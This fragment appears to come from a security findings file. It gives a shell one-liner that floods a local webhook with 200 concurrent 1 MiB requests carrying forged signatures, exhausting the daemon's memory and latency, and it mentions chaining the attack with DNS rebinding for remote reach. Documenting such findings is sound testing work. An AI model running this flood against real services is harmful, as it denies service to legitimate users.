  "suggested_payload_hint": "load generator: `BODY=$(head -c 1048576 /dev/urandom | base64 | head -c 1048576); SIG='sha256='$(printf '%064d' 0); for i in $(seq 1 200); do curl -X POST http://127.0.0.1:8765/webhook/git -H \"X-Hub-Signature-256: $SIG\" -H 'content-type: application/json' --data-binary \"$BODY\" >/dev/null & done`. Each request returns 401 but the daemon paid 1 MiB+HMAC per attempt; observe RSS climb + p99 latency on legitimate /api/v1/runs requests degrade. Chains with the DNS_REBIND row to lift reachability from local-network to remote-browser-driven."
}

